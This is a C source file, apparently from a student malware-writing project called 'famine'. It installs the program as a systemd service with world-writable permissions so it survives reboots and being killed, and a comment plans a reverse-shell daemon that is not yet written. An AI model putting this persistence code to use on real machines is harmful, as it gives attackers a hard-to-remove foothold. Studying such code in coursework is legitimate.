/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/19 11:03:53 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include "service.h"

#include <unistd.h>
#include <stdlib.h>
#include <sys/file.h>

/*
	Setup program as a systemd service, it will restart when host reboots and when it is killed

	see SERVICE_FILE_CONTENT and SERVICE_FILE defines
*/
static int	setup_service_file()
{
	int	fd;

	fd = open(SERVICE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fd == -1)
		return (-1);

	write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
	system(SERVICE_ENABLE);
	system(SERVICE_START);
	return (0);
}

int	run_service()
{
	t_service_ctx	ctx = {0};

	ctx.super_user = getuid() == 0;

	if (lock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE) == -1)
		return (-1);

	if (ctx.super_user)
		setup_service_file();

	// run daemon service
	// idea is to run a socket to open a reverse shell

	return (unlock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE));
}
